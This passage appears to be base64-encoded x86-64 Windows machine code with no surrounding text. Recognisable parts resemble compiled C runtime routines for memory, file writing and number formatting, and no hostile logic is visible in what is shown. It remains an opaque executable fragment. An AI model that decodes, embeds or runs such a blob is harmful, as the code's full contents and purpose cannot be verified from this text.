NSIvHSDkvdAxI/8FIjUAISDkodfRI/8G6CAAAAOg4v///SIvYSIXAdH1IiwdIhcB0UUyL80wr90iDzv9I/8ZmOSxwdfe6AgAAAEiNTgHoB7///zPJSYkEPuh0v///SYsMPkiFyXRATIsHSI1WAegH6v//hcB1G0iDxwhIiwdIhcB1tTPJ6Ei///9Ii8PpUf///0UzyUiJbCQgRTPAM9IzyeiUvf//zOger///zMzp5/v//8zMzEiJXCQISIlsJBBIiXQkGFdIg+wgukgAAACNSvjog77//zP2SIvYSIXAdFtIjagAEgAASDvFdExIjXgwSI1P0EUzwLqgDwAA6IjD//9Ig0/4/0iNTw5IiTeLxsdHCAAACgrGRwwKgGcN+ECIMf/ASP/Bg/gFcvNIg8dISI1H0Eg7xXW4SIvzM8noj77//0iLXCQwSIvGSIt0JEBIi2wkOEiDxCBfw8zMzEiFyXRKSIlcJAhIiXQkEFdIg+wgSI2xABIAAEiL2UiL+Ug7znQSSIvP/xVpcgAASIPHSEg7/nXuSIvL6DS+//9Ii1wkMEiLdCQ4SIPEIF/DSIlcJAhIiXQkEEiJfCQYQVdIg+wwi/GB+QAgAAByKehovf//uwkAAACJGOg8vP//i8NIi1wkQEiLdCRISIt8JFBIg8QwQV/DM/+NTwfoWrn//5CL34sFvUwBAEiJXCQgO/B8NkyNPa1IAQBJOTzfdALrIuiQ/v//SYkE30iFwHUFjXgM6xSLBYxMAQCDwECJBYNMAQBI/8PrwbkHAAAA6Fy5//+Lx+uKSGPRTI0FZkgBAEiLwoPiP0jB+AZIjQzSSYsEwEiNDMhI/yVpcQAAzEhj0UyNBT5IAQBIi8KD4j9IwfgGSI0M0kmLBMBIjQzISP8lSXEAAMxIiVwkCEiJdCQQSIl8JBhBVkiD7CBIY9mFyXhyOx3+SwEAc2pIi8NMjTXyRwEAg+A/SIvzSMH+BkiNPMBJiwT29kT4OAF0R0iDfPgo/3Q/6MCc//+D+AF1J4XbdBYr2HQLO9h1G7n0////6wy59f///+sFufb///8z0v8VMHAAAEmLBPZIg0z4KP8zwOsW6AG8///HAAkAAADo1rv//4MgAIPI/0iLXCQwSIt0JDhIi3wkQEiDxCBBXsPMzEiD7CiD+f51Feiqu///gyAA6MK7///HAAkAAADrToXJeDI7DTxLAQBzKkhjyUyNBTBHAQBIi8GD4T9IwfgGSI0UyUmLBMD2RNA4AXQHSItE0CjrHOhfu///gyAA6He7///HAAkAAADoTLr//0iDyP9Ig8Qow8zMzEiFyQ+EAAEAAFNIg+wgSIvZSItJGEg7DYg2AQB0BejVu///SItLIEg7DX42AQB0BejDu///SItLKEg7DXQ2AQB0Beixu///SItLMEg7DWo2AQB0Beifu///SItLOEg7DWA2AQB0BeiNu///SItLQEg7DVY2AQB0Beh7u///SItLSEg7DUw2AQB0Behpu///SItLaEg7DVo2AQB0BehXu///SItLcEg7DVA2AQB0BehFu///SItLeEg7DUY2AQB0Begzu///SIuLgAAAAEg7DTk2AQB0Begeu///SIuLiAAAAEg7DSw2AQB0BegJu///SIuLkAAAAEg7DR82AQB0Bej0uv//SIPEIFvDzMxIhcl0ZlNIg+wgSIvZSIsJSDsNaTUBAHQF6M66//9Ii0sISDsNXzUBAHQF6Ly6//9Ii0sQSDsNVTUBAHQF6Kq6//9Ii0tYSDsNizUBAHQF6Ji6//9Ii0tgSDsNgTUBAHQF6Ia6//9Ig8QgW8NIiVwkCEiJdCQQV0iD7CAz/0iNBNFIi9lIi/JIuf////////8fSCPxSDvYSA9H90iF9nQUSIsL6ES6//9I/8dIjVsISDv+dexIi1wkMEiLdCQ4SIPEIF/DSIXJD4T+AAAASIlcJAhIiWwkEFZIg+wgvQcAAABIi9mL1eiB////SI1LOIvV6Hb///+NdQWL1kiNS3DoaP///0iNi9AAAACL1uha////SI2LMAEAAI1V++hL////SIuLQAEAAOi/uf//SIuLSAEAAOizuf//SIuLUAEAAOinuf//SI2LYAEAAIvV6Bn///9IjYuYAQAAi9XoC////0iNi9ABAACL1uj9/v//SI2LMAIAAIvW6O/+//9IjYuQAgAAjVX76OD+//9Ii4ugAgAA6FS5//9Ii4uoAgAA6Ei5//9Ii4uwAgAA6Dy5//9Ii4u4AgAA6DC5//9Ii1wkMEiLbCQ4SIPEIF7DSIPsKOh/0P//SI1UJDBIi4iQAAAASIlMJDBIi8joDtP//0iLRCQwSIsASIPEKMPMRTPJZkQ5CXQoTIvCZkQ5CnQVD7cCZjsBdBNJg8ACQQ+3AGaFwHXuSIPBAuvWSIvBwzPAw0BVQVRBVUFWQVdIg+xgSI1sJDBIiV1gSIl1aEiJfXBIiwXCKgEASDPFSIlFIESL6kWL+UiL0U2L4EiNTQDoMm3//4u9iAAAAIX/dQdIi0UIi3gM952QAAAARYvPTYvEi88b0oNkJCgASINkJCAAg+II/8LoEPT//0xj8IXAdQcz/+nOAAAASYv2SAP2SI1GEEg78EgbyUgjyHRTSIH5AAQAAHcxSI1BD0g7wXcKSLjw////////D0iD4PDoQGEAAEgr4EiNXCQwSIXbdG/HA8zMAADrE+i6xP//SIvYSIXAdA7HAN3dAABIg8MQ6wIz20iF23RHTIvGM9JIi8voHjn//0WLz0SJdCQoTYvESIlcJCC6AQAAAIvP6Grz//+FwHQaTIuNgAAAAESLwEiL00GLzf8V+GoAAIv46wIz/0iF23QRSI1L8IE53d0AAHUF6Gi3//+AfRgAdAtIi0UAg6CoAwAA/YvHSItNIEgzzejtKP//SItdYEiLdWhIi31wSI1lMEFfQV5BXUFcXcPMzMzw/0EQSIuB4AAAAEiFwHQD8P8ASIuB8AAAAEiFwHQD8P8ASIuB6AAAAEiFwHQD8P8ASIuBAAEAAEiFwHQD8P8ASI1BOEG4BgAAAEiNFRcsAQBIOVDwdAtIixBIhdJ0A/D/AkiDeOgAdAxIi1D4SIXSdAPw/wJIg8AgSYPoAXXLSIuJIAEAAOl5AQAAzEiJXCQISIlsJBBIiXQkGFdIg+wgSIuB+AAAAEiL2UiFwHR5SI0NCjEBAEg7wXRtSIuD4AAAAEiFwHRhgzgAdVxIi4vwAAAASIXJdBaDOQB1EehKtv//SIuL+AAAAOhG+v//SIuL6AAAAEiFyXQWgzkAdRHoKLb//0iLi/gAAADoMPv//0iLi+AAAADoELb//0iLi/gAAADoBLb//0iLgwABAABIhcB0R4M4AHVCSIuLCAEAAEiB6f4AAADo4LX//0iLixABAAC/gAAAAEgrz+jMtf//SIuLGAEAAEgrz+i9tf//SIuLAAEAAOixtf//SIuLIAEAAOilAAAASI2zKAEAAL0GAAAASI17OEiNBcoqAQBIOUfwdBpIiw9Ihcl0EoM5AHUN6Ha1//9Iiw7obrX//0iDf+gAdBNIi0/4SIXJdAqDOQB1BehUtf//SIPGCEiDxyBIg+0BdbFIi8tIi1wkMEiLbCQ4SIt0JEBIg8QgX+kqtf//zMxIhcl0HEiNBVCGAABIO8h0ELgBAAAA8A/BgVwBAAD/wMO4////f8PMSIXJdDBTSIPsIEiNBSOGAABIi9lIO8h0F4uBXAEAAIXAdQ3osPr//0iLy+jQtP//SIPEIFvDzMxIhcl0GkiNBfCFAABIO8h0DoPI//APwYFcAQAA/8jDuP///3/DzMzMSIPsKEiFyQ+ElgAAAEGDyf/wRAFJEEiLgeAAAABIhcB0BPBEAQhIi4HwAAAASIXAdATwRAEISIuB6AAAAEiFwHQE8EQBCEiLgQABAABIhcB0BPBEAQhIjUE4QbgGAAAASI0VdSkBAEg5UPB0DEiLEEiF0nQE8EQBCkiDeOgAdA1Ii1D4SIXSdATwRAEKSIPAIEmD6AF1yUiLiSABAADoNf///0iDxCjDSIlcJAhXSIPsIOhRy///i4ioAwAASI24kAAAAIUNCi8BAHQISIsfSIXbdSy5BAAAAOhKr///kEiLFdZCAQBIi8/oJgAAAEiL2LkEAAAA6IGv//9Ihdt0DkiLw0iLXCQwSIPEIF/D6IWj//+QSIlcJAhXSIPsIEiL+kiF0nRGSIXJdEFIixlIO9p1BUiLx+s2SIk5SIvP6DH8//9Ihdt060iLy+iw/v//g3sQAHXdSI0FFycBAEg72HTRSIvL6Jb8///rxzPASItcJDBIg8QgX8PMzMxIiVwkCEiJbCQQSIl0JBhXSIPsIEmL6EiL2kiL8UiF0nQdM9JIjULgSPfzSTvAcw/oV7L//8cADAAAADPA60FIhfZ0CuizPQAASIv46wIz/0gPr91Ii85Ii9Po2T0AAEiL8EiFwHQWSDv7cxFIK99IjQw4TIvDM9LoCzT//0iLxkiLXCQwSItsJDhIi3QkQEiDxCBfw8zMzEiD7Cj/Fd5lAABIhcBIiQXMQQEAD5XASIPEKMNIgyW8QQEAALABw8xIiVwkCEiJdCQQV0iD7CBIi/JIi/lIO8p0VEiL2UiLA0iFwHQK/xXdZwAAhMB0CUiDwxBIO9515Ug73nQxSDvfdChIg8P4SIN7+AB0EEiLA0iFwHQIM8n/FatnAABIg+sQSI1DCEg7x3XcMsDrArABSItcJDBIi3QkOEiDxCBfw0iJXCQIV0iD7CBIi9pIi/lIO8p0GkiLQ/hIhcB0CDPJ/xViZwAASIPrEEg733XmSItcJDCwAUiDxCBfw0iJDf1AAQDDQFNIg+wgSIvZ6CIAAABIhcB0FEiLy/8VKGcAAIXAdAe4AQAAAOsCM8BIg8QgW8PMQFNIg+wgM8no66z//5BIix2HIwEAi8uD4T9IMx2rQAEASNPLM8noIa3//0iLw0iDxCBbw0iJXCQITIlMJCBXSIPsIEmL+YsK6Kus//+QSIsdRyMBAIvLg+E/SDMdg0ABAEjTy4sP6OGs//9Ii8NIi1wkMEiDxCBfw8zMzEyL3EiD7Ci4AwAAAE2NSxBNjUMIiUQkOEmNUxiJRCRASY1LCOiP////SIPEKMPMzEiJDSFAAQBIiQ0iQAEASIkNI0ABAEiJDSRAAQDDzMzMSIlcJCBWV0FUQVVBVkiD7ECL2UUz7UQhbCR4QbYBRIh0JHCD+QJ0IYP5BHRMg/kGdBeD+Qh0QoP5C3Q9g/kPdAiNQeuD+AF3fYPpAg+ErwAAAIPpBA+EiwAAAIPpCQ+ElAAAAIPpBg+EggAAAIP5AXR0M//pjwAAAOgKyf//TIvoSIXAdRiDyP9Ii5wkiAAAAEiDxEBBXkFdQVxfXsNIiwBIiw3wdwAASMHhBEgDyOsJOVgEdAtIg8AQSDvBdfIzwEiFwHUS6EGv///HABYAAADoFq7//+uuSI14CEUy9kSIdCRw6yJIjT0rPwEA6xlIjT0aPwEA6xBIjT0hPwEA6wdIjT0APwEASIOkJIAAAAAARYT2dAu5AwAAAOgMq///kEWE9nQUSIs1oyEBAIvOg+E/SDM3SNPO6wNIizdIg/4BD4SUAAAASIX2D4QDAQAAQbwQCQAAg/sLdz1BD6PcczdJi0UISImEJIAAAABIiUQkMEmDZQgAg/sIdVPoi8b//4tAEIlEJHiJRCQg6HvG///HQBCMAAAAg/sIdTJIiwX8dgAASMHgBEkDRQBIiw31dgAASMHhBEgDyEiJRCQoSDvBdB1Ig2AIAEiDwBDr60iLBfogAQBIiQfrBkG8EAkAAEWE9nQKuQMAAADokKr//0iD/gF1BzPA6Yz+//+D+wh1GegFxv//i1AQi8tIi8ZMiwUyZAAAQf/Q6w6Ly0iLxkiLFSFkAAD/0oP7C3fIQQ+j3HPCSIuEJIAAAABJiUUIg/sIdbHowsX//4tMJHiJSBDro0WE9nQIjU4D6CCq//+5AwAAAOhiW///kMxIiVwkEFdIg+wguP//AAAPt9pmO8h0S7gAAQAAZjvIcxVIiwWUKAEAD7fJD7cESA+3yyPB6y4z/2aJTCRATI1MJDBmiXwkMEiNVCRAjU8BRIvB6HE5AACFwHQHD7dEJDDrzTPASItcJDhIg8QgX8PMSIlcJAhIiXQkEEiJfCQYVUiL7EiB7IAAAABIiwXTHwEASDPESIlF8IvySGP5SYvQSI1NyOhHYv//jUcBM9s9AAEAAHcNSItF0EiLCA+3BHnrf0iLVdCLx8H4CEG6AQAAAA+2yEiLAmY5HEh9EIhNwEWNSgFAiH3BiF3C6wpAiH3ARYvKiF3BM8BEiVQkMIlF6EyNRcBmiUXsSI1N0ItCDEGL0olEJChIjUXoSIlEJCDoV/T//4XAdRQ4XeB0C0iLRciDoKgDAAD9M8DrFg+3Regjxjhd4HQLSItNyIOhqAMAAP1Ii03wSDPM6H0e//9MjZwkgAAAAEmLWxBJi3MYSYt7IEmL413DSIlcJAhIiWwkEEiJdCQYV0FWQVdIg+wgTIvxSIXJdHQz20yNPbv+/v+/4wAAAI0EH0G4VQAAAJlJi84rwtH4SGPoSIvVSIv1SAPSSYuU12CoAQDo9DYAAIXAdBN5BY19/+sDjV0BO99+xIPI/+sLSAP2QYuE92ioAQCFwHgWPeQAAABzD0iYSAPAQYuExwCOAQDrAjPASItcJEBIi2wkSEiLdCRQSIPEIEFfQV5fw8xIiVwkCFdIg+wgSIvZSIXJdRXoYav//8cAFgAAAOg2qv//g8j/61GLQRSDz//B6A2oAXQ66Ce1//9Ii8uL+Ojttf//SIvL6FXT//+LyOjKNwAAhcB5BYPP/+sTSItLKEiFyXQK6Ker//9Ig2MoAEiLy+gKOQAAi8dIi1wkMEiDxCBfw8xIiVwkEEiJTCQIV0iD7CBIi9lIhcl1HujYqv//xwAWAAAA6K2p//+DyP9Ii1wkOEiDxCBfw4tBFMHoDKgBdAfouDgAAOvh6E1a//+QSIvL6Cj///+L+EiLy+hGWv//i8fryMzMSIlcJAhMiUwkIFdIg+wgSYv5SYvYiwrokO3//5BIiwNIYwhIi9FIi8FIwfgGTI0F6DUBAIPiP0iNFNJJiwTA9kTQOAF0JOht7v//SIvI/xWgXQAAM9uFwHUe6BGq//9Ii9j/FSxeAACJA+ghqv//xwAJAAAAg8v/iw/oVe3//4vDSItcJDBIg8QgX8OJTCQISIPsOEhj0YP6/nUN6O+p///HAAkAAADrbIXJeFg7FWk5AQBzUEiLykyNBV01AQCD4T9Ii8JIwfgGSI0MyUmLBMD2RMg4AXQtSI1EJECJVCRQiVQkWEyNTCRQSI1UJFhIiUQkIEyNRCQgSI1MJEjo/f7//+sT6Iap///HAAkAAADoW6j//4PI/0iDxDjDzMzMSIlcJAhVVldBVEFVQVZBV0iNbCTZSIHsAAEAAEiLBREcAQBIM8RIiUUfSGPaSYv4SIvDSIlN/4PgP0WL6UiNDej7/v9MiUXnTQPoSIld90yL40yJbbdMjTTAScH8BkqLhOHQOAIASotE8ChIiUW//xVnXAAAM9JIjUwkUIlFp+g8Xv//SItMJFhFM/9FM9JMiX2vTIl9l0iL94tRDIlVq0k7/Q+DNQMAAEiLw4tdm0jB+AZIiUXvig5BvwEAAACITCRARIlUJESB+un9AAAPhX4BAABMjT1R+/7/QYvSTYuMx9A4AgBJi/pLjQTxRDhUOD50C//CSP/HSIP/BXzuSIX/D47tAAAAS4uE59A4AgBMi0W3TCvGQg+2TPA+Rg++vDkgKQIAQf/HRYvvRCvqTWPdTTvYD49oAgAASYvSSIX/fiRIjUUHTCvIT40U8UiNTQdIA8pI/8JCikQRPogBSDvXfOpFM9JFhe1+FUiNTQdNi8NIA89Ii9bonjb//0Uz0kmL0kiF/34fTI0FnPr+/0uLjODQOAIASAPKSP/CRohU8T5IO9d86EiNRQdMiVXHSIlFz0yNTcdBi8JIjVXPQYP/BEiNTCRED5TA/8BEi8BEi/jo2AoAAEiD+P8PhNQCAABBjUX/TIttt0hj+EgD/unSAAAAD7YGSYvVSCvWSg++vDggKQIAjU8BSGPBSDvCD48VAgAAg/kETIlV10GLwkiJdd8PlMBMjU3X/8BIjVXfRIvASI1MJESL2OhwCgAASIP4/w+EbAIAAEgD/kSL++t1SI0F0/n+/0qLlODQOAIAQopM8j32wQR0IUKKRPI+gOH7iEUPQbgCAAAAigZCiEzyPUiNVQ+IRRDrKOhX7v//D7YOM9JmORRIfRJI/8dJO/0Pg9QBAABEjUIC6wNNi8dIi9ZIjUwkROhatv//g/j/D4TvAQAAi02nSI1FFzPbTI1EJERIiVwkOEiNdwFIiVwkMEWLz8dEJCgFAAAAM9JIiUQkIOgC0P//i/iFwA+ExAEAAEiLTb9MjUwkSESLwEiJXCQgSI1VF/8VfVsAAEUz0oXAD4SVAQAATIt9r4vOK03nQo0cOYldmzl8JEgPgpoAAACAfCRACnVESItNv0GNQg1MjUwkSGaJRCRARY1CAUyJVCQgSI1UJED/FStbAABFM9KFwA+EMQEAAIN8JEgBcltB/8f/w0yJfa+JXZtIi/5JO/VzR0iLRe+LVavpFP3//0GL0k2FwH4tSCv3SI0dd/j+/4oEPv/CSouM49A4AgBIA89I/8dCiETxPkhjwkk7wHzgi12bQQPYiV2bRDhVj3QMSItEJFCDoKgDAAD9SItF//IPEEWXSItNr/IPEQCJSAhIi00fSDPM6JwX//9Ii5wkQAEAAEiBxAABAABBX0FeQV1BXF9eXcNFi8pIhdJ+QkyLbfdNi8JNi9VBg+U/ScH6Bk6NHO0AAAAATQPdQYoEMEH/wUuLjNfQOAIASQPISf/AQohE2T5JY8FIO8J83kUz0gPa6V////+KBkyNBaf3/v9Li4zg0DgCAP/DiV2bQohE8T5Li4Tg0DgCAEKATPA9BDhVj+k1/////xXBWAAAiUWXgH2PAOkj/////xWvWAAAiUWXOF2P6RL///9IiVwkCEiJbCQYVldBVrhQFAAA6GROAABIK+BIiwVCFwEASDPESImEJEAUAABMY9JIi/lJi8JBi+lIwfgGSI0N6C8BAEGD4j9JA+hJi/BIiwTBS40U0kyLdNAoM8BIiQeJRwhMO8Vzb0iNXCRASDv1cySKBkj/xjwKdQn/RwjGAw1I/8OIA0j/w0iNhCQ/FAAASDvYctdIg2QkIABIjUQkQCvYTI1MJDBEi8NIjVQkQEmLzv8VE1kAAIXAdBKLRCQwAUcEO8NyD0g79XKb6wj/Fc9XAACJB0iLx0iLjCRAFAAASDPM6PIV//9MjZwkUBQAAEmLWyBJi2swSYvjQV5fXsPMzEiJXCQISIlsJBhWV0FWuFAUAADoYE0AAEgr4EiLBT4WAQBIM8RIiYQkQBQAAExj0kiL+UmLwkGL6UjB+AZIjQ3kLgEAQYPiP0kD6EmL8EiLBMFLjRTSTIt00CgzwEiJB4lHCEw7xQ+DggAAAEiNXCRASDv1czEPtwZIg8YCZoP4CnUQg0cIArkNAAAAZokLSIPDAmaJA0iDwwJIjYQkPhQAAEg72HLKSINkJCAASI1EJEBIK9hMjUwkMEjR+0iNVCRAA9tJi85Ei8P/FfhXAACFwHQSi0QkMAFHBDvDcg9IO/VyiOsI/xW0VgAAiQdIi8dIi4wkQBQAAEgzzOjXFP//TI2cJFAUAABJi1sgSYtrMEmL40FeX17DzMzMSIlcJAhIiWwkGFZXQVRBVkFXuHAUAADoQEwAAEgr4EiLBR4VAQBIM8RIiYQkYBQAAExj0kiL2UmLwkWL8UjB+AZIjQ3ELQEAQYPiP00D8E2L+EmL+EiLBMFLjRTSTItk0CgzwEiJA007xolDCA+DzgAAAEiNRCRQSTv+cy0Ptw9Ig8cCZoP5CnUMug0AAABmiRBIg8ACZokISIPAAkiNjCT4BgAASDvBcs5Ig2QkOABIjUwkUEiDZCQwAEyNRCRQSCvBx0QkKFUNAABIjYwkAAcAAEjR+EiJTCQgRIvIuen9AAAz0ugiy///i+iFwHRJM/aFwHQzSINkJCAASI2UJAAHAACLzkyNTCRARIvFSAPRSYvMRCvG/xWPVgAAhcB0GAN0JEA79XLNi8dBK8eJQwRJO/7pNP////8VRVUAAIkDSIvDSIuMJGAUAABIM8zoaBP//0yNnCRwFAAASYtbMEmLa0BJi+NBX0FeQVxfXsNIiVwkEEiJdCQYiUwkCFdBVEFVQVZBV0iD7CBFi/BMi/pIY9mD+/51GOjCoP//gyAA6Nqg///HAAkAAADpjwAAAIXJeHM7HVEwAQBza0iLw0iL80jB/gZMjS0+LAEAg+A/TI0kwEmLRPUAQvZE4DgBdEaLy+iz4///g8//SYtE9QBC9kTgOAF1FeiCoP//xwAJAAAA6Feg//+DIADrD0WLxkmL14vL6EEAAACL+IvL6KDj//+Lx+sb6DOg//+DIADoS6D//8cACQAAAOggn///g8j/SItcJFhIi3QkYEiDxCBBX0FeQV1BXF/DzEiJXCQgVVZXQVRBVUFWQVdIi+xIg+xgRYvwSIv6TGPhRYXAD4SXAgAASIXSdSDo0Z///4MgAOjpn///xwAWAAAA6L6e//+DyP/pdAIAAEmLxEiNDVgrAQCD4D9Ni+xJwf0GTI08wEqLDOlCinT5OY1G/zwBdwlBi8b30KgBdK9C9kT5OCB0DjPSQYvMRI1CAuhHLwAAM9tBi8xIiV3g6OUgAACFwA+EAwEAAEiNBf4qAQBKiwToQjhc+DgPje0AAADoXrf//0iLiJAAAABIOZk4AQAAdRZIjQXTKgEASosE6EI4XPg5D4TCAAAASI0FvSoBAEqLDOhIjVXwSotM+Sj/FZJSAACFwA+EoAAAAECE9nR9QP7OQID+AQ+HLAEAADP2To0kN0iJddBMi/dJO/xzV4td1EEPtwYPt8hmiUXw6J8uAAAPt03wZjvBdTKDwwKJXdRmg/kKdRu5DQAAAOiALgAAuQ0AAABmO8F1Ev/DiV3U/8ZJg8YCTTv0cwvrtf8VolIAAIlF0Ive6bIAAABFi85IjU3QTIvHQYvU6BL1///yDxAAi1gI6ZkAAABIjQX7KQEASosM6EI4XPk4fU9AD77OQIT2dDKD6QF0GYP5AXV5RYvOSI1N0EyLx0GL1Oij+v//67tFi85IjU3QTIvHQYvU6Kv7///rp0WLzkiNTdBMi8dBi9Tod/n//+uTSotM+ShMjU3UM8BFi8ZIIUQkIEiL10iJRdCJRdj/FR5TAACFwHUJ/xXsUQAAiUXQi13Y8g8QRdDyDxFF4EiLReBIwegghcB1YYtN4IXJdCqD+QV1G+i7nf//xwAJAAAA6JCd///HAAUAAADpx/3//+gwnf//6b39//9IjQUgKQEASosE6EL2RPg4QHQFgD8adB/ofp3//8cAHAAAAOhTnf//gyAA6Y39//+LReQrw+sCM8BIi5wkuAAAAEiDxGBBX0FeQV1BXF9eXcPMzEBTSIPsQEhj2UiNTCQg6IVS//+NQwE9AAEAAHcTSItEJChIiwgPtwRZJQCAAADrAjPAgHwkOAB0DEiLTCQgg6GoAwAA/UiDxEBbw8xAU0iD7DBIi9lIjUwkIOjlLAAASIP4BHcai1QkILn9/wAAgfr//wAAD0fRSIXbdANmiRNIg8QwW8PMzMxIiVwkEEiJbCQYV0FUQVVBVkFXSIPsIEiLOkUz7U2L4UmL6EyL8kyL+UiFyQ+E7gAAAEiL2U2FwA+EoQAAAEQ4L3UIQbgBAAAA6x1EOG8BdQhBuAIAAADrD4pHAvbYTRvASffYSYPAA02LzEiNTCRQSIvX6EQsAABIi9BIg/j/dHVIhcB0Z4tMJFCB+f//AAB2OUiD/QF2R4HBAAD//0G4ANgAAIvBiUwkUMHoCkj/zWZBC8BmiQO4/wMAAGYjyEiDwwK4ANwAAGYLyGaJC0gD+kiDwwJIg+0BD4Vf////SSvfSYk+SNH7SIvD6xtJi/1mRIkr6+lJiT7owpv//8cAKgAAAEiDyP9Ii1wkWEiLbCRgSIPEIEFfQV5BXUFcX8NJi91EOC91CEG4AQAAAOsdRDhvAXUIQbgCAAAA6w+KRwL22E0bwEn32EmDwANNi8xIi9czyehiKwAASIP4/3SZSIXAdINIg/gEdQNI/8NIA/hI/8PrrczMSIPsKEiFyXUOSYMgALgBAAAA6ZcAAACF0nUEiBHr6vfCgP///3UEiBHr4vfCAPj//3ULQbkBAAAAQbLA6zn3wgAA//91GI2CACj//z3/BwAAdkhBuQIAAABBsuDrGffCAADg/3U1gfr//xAAdy1BuQMAAABBsvBNi9mKwsHqBiQ/DIBBiAQLSYPrAXXtQQrSSY1BAYgRTSEY6xNJgyAA6KSa///HACoAAABIg8j/SIPEKMPM6Uf////MzMxIiVwkCFdIg+wgRYvYTIvRSIXJdRjocpr//7sWAAAAiRjoRpn//4vD6aoAAABIhdJ04zPAxgEARYXbQQ9Pw//ASJhIO9B3DOhAmv//uyIAAADrzE2FyXS9SYtZCEyNQQHGATDrIQ+2C0iNQwGEybowAAAAD0XRSA9Ew0GIEEiL2En/wEH/y0WF23/aQcYAAHgagDs1fBXrBEHGADBJ/8hBigA8OXTy/sBBiABBgDoxdQZB/0EE6x5Jg8j/Sf/AQ4B8AgEAdfVJ/8BJjVIBSYvK6GMo//8zwEiLXCQwSIPEIF/DzMzMzMzMSIlUJBBTVVZXQVRBVkFXSIHsIAIAAESLEUyL8kiL8UWF0g+E7QMAAIs6hf8PhOMDAABB/8qNR/+FwA+F4gAAAESLYgQz7UGD/AF1JotZBEyNRCRESIPBBIkuRTPJiWwkQLrMAQAA6PUVAACLw+mlAwAARYXSdTaLWQRMjUQkRIkpRTPJSIPBBIlsJEC6zAEAAOjKFQAAM9KLw0H39IXSiVYEQA+VxYku6WoDAABBv/////9Ii/1Mi/VFO9d0KEmLzEKLRJYEM9JJweYgRQPXSQvGSMHnIEj38YvATIvySAP4RTvXddtFM8mJbCRATI1EJESJLrrMAQAASI1OBOheFQAASYvORIl2BEjB6SBIi8eFyYlOCEAPlcX/xYku6fUCAABBO8IPh+oCAABFi8JJY9JEK8BFi8pJY9hIO9N8SUiDwQRIjQSdAAAAAE2L3kwr2Ewr3kiNDJGLAUE5BAt1EUH/yUj/ykiD6QRIO9N96esXQYvBQSvASGPQSWPBi0yGBEE5TJYEcwNB/8BFhcAPhIECAACNR/+7IAAAAEWLTIYEjUf+QYtshgRBD73BiawkYAIAAHQLQbsfAAAARCvY6wNEi9tBK9tEiZwkcAIAAIlcJCBFhdt0N0GLwYvVi8vT6kGLy9PgRIvK0+VEC8iJrCRgAgAAg/8CdhWNR/2Ly0GLRIYE0+gL6ImsJGACAAAz7UWNcP9Ei+VFhfYPiL8BAACLw0G//////0GL2UyJrCQYAgAARY0sPkiJXCQ4SIlEJDBFO+p3B0KLVK4E6wKL1UGNRf+JlCR4AgAAi0yGBEGNRf5Ei1yGBEiJTCQoiVQkLIuUJHACAACF0nQ0SItMJDBFi8NIi0QkKEnT6IvKSNPgTAvAQdPjQYP9A3IYi0wkIEGNRf2LRIYE0+hEC9jrBUyLRCQoM9JJi8BI9/NEi8JMi8hJO8d2F0i4AQAAAP////9JA8FNi89ID6/DTAPATTvHdyqLlCRgAgAAi8JJD6/BSYvISMHhIEkLy0g7wXYOSf/JSCvCTAPDTTvHduNNhckPhKoAAABMi9VEi92F/3ROSIucJGgCAABIg8MEDx8AiwNIjVsESQ+vwUwD0EONBDNFi8KLyEnB6iCLRIYESYvSSf/CQTvATA9D0kErwEH/w4lEjgREO99yxkiLXCQ4i4QkeAIAAEk7wnNCRIvVhf90OEyLnCRoAgAATIvFSYPDBEONBDJB/8KLTIYESI0UhkGLA02NWwRMA8BMA8FEiUIEScHoIEQ713LXSf/JRY1V/0nB5CBB/81Bi8FMA+BBg+4BD4lq/v//TIusJBgCAABBjVIBi8o7FnMSZg8fRAAAi8H/wYlshgQ7DnL0iRaF0nQO/8o5bJYEdQaJFoXSdfJJi8TrAjPASIHEIAIAAEFfQV5BXF9eXVvDzMzMQFVTVldBVEFVQVZBV0iNrCQo+f//SIHs2AcAAEiLBRkIAQBIM8RIiYXABgAASIlMJDhJi/FIjUwkWEyJTCRoTYvwTIlEJHiL+ugCJwAAi0QkWEUz5IPgHzwfdQdEiGQkYOsPSI1MJFjoTycAAMZEJGABSItEJDi7IAAAAEiFwEmJdgiLy0G5/wcAAEm6////////DwCNUw0PSMpIi9BIweo0QYkOSSPRdRVJhcJ1EEWJZgRMjQVGsgAA6T8RAABJO9F0BUGLzOtBSIvISSPKdQe5AQAAAOsqSIXAeRZIugAAAAAAAAgASDvKdQe5BAAAAOsPSIvISMHpM/fRg+EBg8kCQcdGBAEAAACD6QEPhAARAACD6QEPhNsQAACD6QEPhMkQAACD+QEPhLcQAABIuf////////9/vgIAAABII8FIiUQkOP/H8g8QRCQ4iXwkUPIPEUQkSEiLVCRITIvCScHoNEmLyEkjyUiLwUj32Ei4AAAAAAAAEABIG/9JI9JII/hIA/pI99kbwEUjwUSNPAZFA/joOycAAOhuJgAA8g8syIl9hI2BAQAAgIPg/vfYRRvtSMHvIEQj6Yl9iIvHRIlsJED32BvS99r/wolVgEGB/zQEAAAPgoUCAAAzwMeFKAMAAAAAEACJhSQDAACJtSADAACF/w+EQgEAAEWLxEGLyItEjYQ5hI0kAwAAD4UrAQAAQf/ARDvGdeRFjZ/O+///RIlkJDhFi8ONQv9Bg+MfQcHoBYvzvwEAAABBK/OLzkjT5//Pi8gPvUSFhESL/0H313QE/8DrA0GLxCvYQo0EAoP4c3UHsQFEO9t3A0GKzEGDzP+D+HMPh4wAAACEyQ+FhAAAAEG+cgAAAEE7xkQPQvBFi9ZFO/R0T0U70HJKQYvCQSvAjUj/O8JzB0SLTIWE6wNFM8k7ynMGi1SNhOsCM9JBI9dBi8KLzkQjz9PqRQPUQYvLQdPhQQvRiVSFhEU71HQFi1WA67EzyUWFwHQMg2SNhAD/wUE7yHX0RDvbQY1GAUQPR/DrA0Uz9oOlKAMAAABBvwEAAABEib1QAQAARIl1gMeFIAMAAAEAAADHhVQBAAAEAAAA6SIDAABFjZ/N+///RIlkJDhFi8ONQv9Bg+MfQcHoBYvzvwEAAABBK/OLzkjT5//Pi8gPvUSFhESL/0H313QE/8DrA0GLxCvYQo0EAoP4c3UHsQFEO9t3A0GKzEGDzP+D+HMPh4wAAACEyQ+FhAAAAEG+cgAAAEE7xkQPQvBFi9ZFO/R0T0U70HJKQYvCQSvAjUj/O8JzB0SLTIWE6wNFM8k7ynMGi1SNhOsCM9JBI9dBi8KLzkQjz9PqRQPUQYvLQdPhQQvRiVSFhEU71HQFi1WA67EzyUWFwHQMg2SNhAD/wUE7yHX0RDvbQY1GAUQPR/DrA0Uz9oOlKAMAAABBvwEAAABEib1QAQAARIl1gMeFIAMAAAEAAADHhVQBAAACAAAA6f8BAABBg/82D4QpAQAAM8DHhSgDAAAAABAAiYUkAwAAibUgAwAAhf8PhAkBAABFi8R